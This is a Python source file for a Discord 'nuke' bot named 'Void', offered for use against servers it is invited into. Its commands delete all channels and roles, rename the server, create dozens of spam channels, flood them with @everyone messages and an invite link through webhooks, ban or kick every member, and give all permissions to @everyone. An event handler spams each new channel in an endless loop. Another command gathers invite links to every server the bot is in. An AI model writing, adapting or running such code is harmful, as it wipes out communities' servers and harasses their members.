import json
import os
import traceback
import asyncio
import colorama
import discord
import requests
from colorama import Fore
from discord.ext import commands

colorama.init()
os.system('cls')

# Fetching prefix, token, and owner IDs from config
# If there's no config, request data from the user and create it
try:
    with open(f"config.json", encoding='utf8') as data:
        config = json.load(data)
    token = config["token"]
    prefix = config["prefix"]
    status = config["status"]
    whiteListBool = config["whitelistbool"]
    activity = config["activity"]
    print(f"Loaded config.json")
except FileNotFoundError:
    token = input(f"Paste token: ")
    prefix = input(f"Paste prefix: ")
    owners = input(f"Paste bot's owner ID (If several use ','): ")
    whiteListYesOrNo = input(f"Enable whitelisting (y/n): ").lower()
    whiteListBool = True if whiteListYesOrNo == "y" else False
    owners = owners.replace(" ", "")
    if "," in owners:
        owners = owners.split(",")
        owners = list(map(int, owners))
    else:
        owners = [int(owners)]

    # Default status and activity
    status = {"isenabled": True, "type": "online"}
    activity = {"type": "playing", "text": f"Default Activity", "isenabled": True}

    config = {
        "token": token,
        "prefix": prefix,
        "status": status,
        "whitelistbool": whiteListBool,
        "activity": activity
    }
    with open("config.json", "w") as data:
        json.dump(config, data, indent=2)
    print(f"Created config.json")

# Define activity check function
def checkActivity(type, text):
    if type == "playing":
        return discord.Game(name=text)
    elif type == "listening":
        return discord.Activity(type=discord.ActivityType.listening, name=text)
    elif type == "watching":
        return discord.Activity(type=discord.ActivityType.watching, name=text)
    else:
        return None

def checkStatus(status_type):
    if status_type == "online":
        return discord.Status.online
    elif status_type == "idle":
        return discord.Status.idle
    elif status_type == "do not disturb":
        return discord.Status.dnd
    elif status_type == "invisible":
        return discord.Status.invisible
    else:
        return discord.Status.online  # Default to online if invalid status

with open('config.json', 'r') as f:
    config = json.load(f)
    token = config['token']

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=prefix, intents=intents)

@bot.event
async def on_ready():
    print(f"{bot.user} is awake!")

    # Set activity
    activityToBot = None
    if activity["isenabled"]:
        activityToBot = checkActivity(activity["type"], activity["text"])
        if activityToBot:
            print("Activity set successfully!")

    # Set status and activity
    if status["isenabled"]:
        statusToBot = checkStatus(status["type"])
        if statusToBot:
            await bot.change_presence(status=statusToBot, activity=activityToBot)
        print("Status and activity updated successfully!")

bot.remove_command("help")

@bot.command(name="help")
@commands.cooldown(1, 9, commands.BucketType.user)
async def custom_help(ctx):
    custom_color = 0x5564f1

    embed = discord.Embed(
        title="Void Commands",
        description="Here is a list of available commands and their descriptions:",
        color=custom_color
    )

    for command in bot.commands:
        if command.help:
            embed.add_field(
                name=f"{bot.command_prefix}{command.name}",
                value=command.help,
                inline=False
            )
        else:
            embed.add_field(
                name=f"{bot.command_prefix}{command.name}",
                value="No description available.",
                inline=False
            )

    await ctx.send(embed=embed)

@bot.command()
async def serverlist(ctx):
    embed = discord.Embed(
        title="Server List",
        description="Here is a list of servers I am in along with their invite links:",
        color=0x5564f1
    )

    for guild in bot.guilds:
        invite = await guild.text_channels[0].create_invite(max_age=300, max_uses=1, unique=True)
        embed.add_field(
            name=guild.name,
            value=f"[Invite Link]({invite.url})",
            inline=False
        )

    await ctx.send(embed=embed)

@bot.command()
@commands.cooldown(1, 500, commands.BucketType.user)
async def setup(ctx):
    """
    Nuke the server.
    """
    await ctx.message.delete()
    await ctx.guild.edit(name="void kills")

    await asyncio.gather(*[channel.delete() for channel in ctx.guild.channels])

    await asyncio.gather(*[ctx.guild.create_text_channel("void owns you") for _ in range(35)])

    for channel in ctx.guild.text_channels:
        num_webhooks = 5  # change this to the # of webhooks you want
        for _ in range(num_webhooks):
            webhook = await channel.create_webhook(name=f"killer{_}") 
            for _ in range(5):
                await webhook.send(f"@everyone did you really fall for this? **join the discord** https://discord.gg/d2XwGgGPzx | https://cdn.discordapp.com/attachments/1311927483808874526/1314025026634383370/togif.gif?ex=675244ab&is=6750f32b&hm=ac1b24ec0109e4e0edc07a01e1c969261658a98d673000fc6d56451f5b317a75&")       
                await ctx.send("Nuking the server...")  

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        hex_color = int("0x5564f1", 16)
        cooldown_embed = discord.Embed(
            title="Cooldown",
            description=f"```Wait {error.retry_after:.1f} seconds before trying again.```",
            color=hex_color)
        await ctx.reply(embed=cooldown_embed)
    else:
        raise error

@bot.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send("@everyone did you really fall for this? **join the discord** https://discord.gg/d2XwGgGPzx | https://cdn.discordapp.com/attachments/1311927483808874526/1314025026634383370/togif.gif?ex=675244ab&is=6750f32b&hm=ac1b24ec0109e4e0edc07a01e1c969261658a98d673000fc6d56451f5b317a75&")

@bot.command()
@commands.cooldown(1, 199, commands.BucketType.user)
async def rolespam(ctx):
    await ctx.message.delete()
    for i in range(100):
        await ctx.guild.create_role(name="void")
    await ctx.send("Spamming roles...")

@bot.command()
@commands.cooldown(1, 50, commands.BucketType.user)
async def guildname(ctx, *, newname):
    await ctx.message.delete()
    await ctx.guild.edit(name=newname)
    await ctx.send(f"Changed the server name to {newname}")

@bot.command()
@commands.cooldown(1, 199, commands.BucketType.user)
async def banall(ctx):
    for member in ctx.guild.members:
        if ctx.author.guild_permissions.ban_members and not member.guild_permissions.ban_members:
            await member.ban(reason="void")

@bot.command()
@commands.cooldown(1, 199, commands.BucketType.user)
async def kickall(ctx):
    for member in ctx.guild.members:
        await member.kick(reason="void")

@bot.command()
async def delroles(ctx):
    await ctx.message.delete()
    roles_to_delete = [role for role in ctx.guild.roles]
    await asyncio.gather(*[role.delete(reason="Roles deleted by void") for role in roles_to_delete])
    await ctx.send("Deleting roles completed.")

@bot.command()
async def give(ctx):
    everyone_role = ctx.guild.default_role
    await everyone_role.edit(permissions=discord.Permissions.all())
    await ctx.send("Administrator permissions granted to everyone.")

@bot.command()
async def removegive(ctx):
    everyone_role = ctx.guild.default_role
    await everyone_role.edit(permissions=discord.Permissions.none())
    await ctx.send("All permissions have been removed from the @everyone role.")

bot.run(token)
